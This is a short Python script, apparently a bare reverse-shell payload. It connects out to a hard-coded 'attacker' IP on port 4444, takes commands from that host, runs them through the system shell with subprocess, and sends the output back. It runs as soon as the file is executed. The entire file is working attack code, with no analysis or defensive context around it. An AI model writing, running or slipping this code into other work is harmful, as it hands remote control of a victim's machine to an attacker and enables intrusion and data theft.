import socket
import subprocess
import os

# Set attacker's IP and port
ATTACKER_IP = "192.168.1.5"
ATTACKER_PORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                s.send(b"Changed directory.\n")
            except Exception as e:
                s.send(str(e).encode() + b"\n")
        else:
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)
    s.close()

connect()
